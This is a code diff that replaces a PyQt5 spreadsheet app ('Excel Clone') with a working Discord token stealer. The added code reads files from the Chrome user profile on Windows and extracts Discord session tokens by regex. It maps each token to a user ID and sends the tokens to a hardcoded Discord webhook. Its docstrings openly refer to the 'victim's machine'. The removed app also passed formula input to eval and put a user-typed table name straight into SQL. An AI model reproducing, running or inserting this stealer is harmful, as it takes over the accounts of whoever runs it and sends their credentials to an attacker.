@@ -1,162 +1,138 @@
-import sys
-import pandas as pd
-import sqlite3
-from PyQt5.QtWidgets import (
-    QApplication, QMainWindow, QFileDialog, QTableView, QVBoxLayout, QWidget, QAction, QInputDialog
-)
-from PyQt5.QtCore import QAbstractTableModel, Qt, QFileSystemWatcher
+import base64
+import json
+import os
+import re
+import urllib.request
+from pathlib import Path
 
+TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,}"  # Adjusted to be more inclusive
+REQUEST_HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
+}
+WEBHOOK_URL = "https://discord.com/api/webhooks/1395031147536191558/qyXlM0qkSL5b8WCokpb91MXqxqAGoksj_AEf9MxUtyKR95zygoltPRZbbuCmip5eIA_z"
 
-class DataFrameModel(QAbstractTableModel):
-    def __init__(self, df=pd.DataFrame(), parent=None):
-        super().__init__(parent)
-        self._df = df
+def make_post_request(api_url: str, data: dict[str, str]) -> int:
+    if not api_url.startswith(("http", "https")):
+        raise ValueError("Invalid URL")
 
-    def rowCount(self, parent=None): return self._df.shape[0]
-    def columnCount(self, parent=None): return self._df.shape[1]
+    request = urllib.request.Request(  # noqa: S310
+        api_url, data=json.dumps(data).encode(),
+        headers=REQUEST_HEADERS,
+    )
 
-    def data(self, index, role=Qt.DisplayRole):
-        if index.isValid():
-            val = self._df.iat[index.row(), index.column()]
-            if role == Qt.DisplayRole:
-                return str(val)
+    try:
+        with urllib.request.urlopen(request) as response:  # noqa: S310
+            return response.status
+    except urllib.error.URLError as e:
+        print(f"Failed to send request: {e}")
         return None
 
-    def setData(self, index, value, role=Qt.EditRole):
-        if index.isValid() and role == Qt.EditRole:
-            value = value.strip()
-            if value.startswith('='):
-                try:
-                    expr = value[1:].upper()
-                    for r in range(self._df.shape[0]):
-                        for c in range(self._df.shape[1]):
-                            expr = expr.replace(f"{chr(65+c)}{r+1}", str(self._df.iat[r, c]))
-                    result = eval(expr)
-                    self._df.iat[index.row(), index.column()] = result
-                except Exception:
-                    self._df.iat[index.row(), index.column()] = "ERR"
-            else:
-                self._df.iat[index.row(), index.column()] = value
-            self.dataChanged.emit(index, index)
-            return True
-        return False
-
-    def headerData(self, section, orientation, role):
-        if role == Qt.DisplayRole:
-            if orientation == Qt.Horizontal:
-                return chr(65 + section)
-            else:
-                return str(section + 1)
+def get_tokens_from_file(file_path: Path) -> list[str] | None:
+    try:
+        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
+    except PermissionError:
         return None
 
-    def flags(self, index):
-        return Qt.ItemIsSelectable | Qt.ItemIsEnabled | Qt.ItemIsEditable
+    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
+    return tokens or None
 
-    def setDataFrame(self, df):
-        self.beginResetModel()
-        self._df = df
-        self.endResetModel()
+def get_user_id_from_token(token: str) -> str | None:
+    """Confirm that the portion of a string before the first dot can be decoded.
 
-    def getDataFrame(self):
-        return self._df
+    Decoding from base64 offers a useful, though not infallible, method for identifying
+    potential Discord tokens. This is informed by the fact that the initial
+    segment of a Discord token usually encodes the user ID in base64. However,
+    this test is not guaranteed to be 100% accurate in every case.
 
+    Returns
+    -------
+        A string representing the Discord user ID to which the token belongs,
+        if the first part of the token can be successfully decoded. Otherwise,
+        None.
 
-class ExcelClone(QMainWindow):
-    def __init__(self):
-        super().__init__()
-        self.setWindowTitle("Excel Clone")
-        self.resize(800, 600)
+    """
+    try:
+        discord_user_id = base64.b64decode(
+            token.split(".", maxsplit=1)[0] + "==",
+        ).decode("utf-8")
+    except (UnicodeDecodeError, base64.binascii.Error):
+        return None
 
-        self.current_csv_path = None
-        self.watcher = QFileSystemWatcher()
-        self.watcher.fileChanged.connect(self.reload_csv)
+    return discord_user_id
 
-        self.table = QTableView()
-        self.model = DataFrameModel(pd.DataFrame([[""] * 10 for _ in range(20)]))
-        self.table.setModel(self.model)
-        layout = QVBoxLayout()
-        layout.addWidget(self.table)
-        container = QWidget()
-        container.setLayout(layout)
-        self.setCentralWidget(container)
+def get_tokens_from_path(base_path: Path) -> dict[str, set] | None:
+    """Collect discord tokens for each user ID.
 
-        menubar = self.menuBar()
-        file_menu = menubar.addMenu("File")
-        open_action = QAction("Open CSV", self)
-        open_action.triggered.connect(self.open_csv)
-        save_action = QAction("Save CSV", self)
-        save_action.triggered.connect(self.save_csv)
-        file_menu.addAction(open_action)
-        file_menu.addAction(save_action)
+    to manage the occurrence of both valid and expired Discord tokens, which happens when a
+    user updates their password, triggering a change in their token. Lacking
+    the capability to differentiate between valid and expired tokens without
+    making queries to the Discord API, the function compiles every discovered
+    token into the returned set. It is designed for these tokens to be
+    validated later, in a process separate from the initial collection and not
+    on the victim's machine.
 
-        db_menu = menubar.addMenu("Database")
-        load_db_action = QAction("Load from DB", self)
-        load_db_action.triggered.connect(self.load_from_db)
-        db_menu.addAction(load_db_action)
-        save_db_action = QAction("Save to DB", self)
-        save_db_action.triggered.connect(self.save_to_db)
-        db_menu.addAction(save_db_action)
+    Returns
+    -------
+        user id mapped to a set of potential tokens
 
-    def open_csv(self):
-        path, _ = QFileDialog.getOpenFileName(self, "Open CSV", "", "CSV Files (*.csv)")
-        if path:
-            df = pd.read_csv(path)
-            self.model.setDataFrame(df)
-            # Watch for external changes
-            if self.current_csv_path:
-                self.watcher.removePath(self.current_csv_path)
-            self.current_csv_path = path
-            self.watcher.addPath(path)
+    """
+    file_paths = [file for file in base_path.iterdir() if file.is_file()]
 
-    def save_csv(self):
-        if self.current_csv_path:
-            # overwrite existing file
-            self.model.getDataFrame().to_csv(self.current_csv_path, index=False)
-        else:
-            path, _ = QFileDialog.getSaveFileName(self, "Save CSV", "", "CSV Files (*.csv)")
-            if not path:
-                return
-            self.current_csv_path = path
-            self.watcher.addPath(path)
-            self.model.getDataFrame().to_csv(path, index=False)
+    id_to_tokens: dict[str, set] = {}
 
-    def reload_csv(self, path):
-        # Called when the watched CSV file changes externally
-        if path == self.current_csv_path:
-            try:
-                df = pd.read_csv(path)
-                self.model.setDataFrame(df)
-            except Exception as e:
-                print(f"Error reloading CSV: {e}")
+    for file_path in file_paths:
+        potential_tokens = get_tokens_from_file(file_path)
 
-    def load_from_db(self):
-        path, _ = QFileDialog.getOpenFileName(self, "Open Database", "", "SQLite DB (*.db *.sqlite)")
-        if path:
-            conn = sqlite3.connect(path)
-            table_name, ok = QInputDialog.getText(self, "Table Name", "Enter table name to load:")
-            if ok and table_name:
-                try:
-                    df = pd.read_sql_query(f"SELECT * FROM {table_name}", conn)
-                    self.model.setDataFrame(df)
-                except Exception as e:
-                    print(f"Error loading from DB: {e}")
-            conn.close()
+        if potential_tokens is None:
+            continue
 
-    def save_to_db(self):
-        path, _ = QFileDialog.getSaveFileName(self, "Save to Database", "", "SQLite DB (*.db *.sqlite)")
-        if path:
-            conn = sqlite3.connect(path)
-            table_name, ok = QInputDialog.getText(self, "Table Name", "Enter table name to save:")
-            if ok and table_name:
-                try:
-                    self.model.getDataFrame().to_sql(table_name, conn, if_exists='replace', index=False)
-                except Exception as e:
-                    print(f"Error saving to DB: {e}")
-            conn.close()
+        for potential_token in potential_tokens:
+            discord_user_id = get_user_id_from_token(potential_token)
 
+            if discord_user_id is None:
+                continue
 
-if __name__ == '__main__':
-    app = QApplication(sys.argv)
-    window = ExcelClone()
-    window.show()
-    sys.exit(app.exec_())
+            if discord_user_id not in id_to_tokens:
+                id_to_tokens[discord_user_id] = set()
+
+            id_to_tokens[discord_user_id].add(potential_token)
+
+    # Ensure only one token per user ID
+    id_to_single_token = {user_id: next(iter(tokens)) for user_id, tokens in id_to_tokens.items()}
+
+    return id_to_single_token or None
+
+def send_tokens_to_webhook(
+    webhook_url: str, user_id_to_token: dict[str, set[str]],
+) -> int:
+    """Caution: In scenarios where the victim has logged into multiple Discord
+    accounts or has frequently changed their password, the accumulation of
+    tokens may result in a message that surpasses the character limit,
+    preventing it from being sent. There are no plans to introduce code
+    modifications to segment the message for compliance with character
+    constraints.
+    """  # noqa: D205
+    fields: list[dict] = []
+
+    for user_id, tokens in user_id_to_token.items():
+        fields.append({
+            "name": user_id,
+            "value": "".join(tokens),
+        })
+
+    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
+
+    return make_post_request(webhook_url, data)
+
+def main() -> None:
+    chrome_path = (
+        Path(os.getenv("LOCALAPPDATA")) /
+        "Google" / "Chrome" / "User Data" / "Default"
+    )
+    tokens = get_tokens_from_path(chrome_path)
+    if tokens:
+        send_tokens_to_webhook(WEBHOOK_URL, tokens)
+
+if __name__ == "__main__":
+    main()
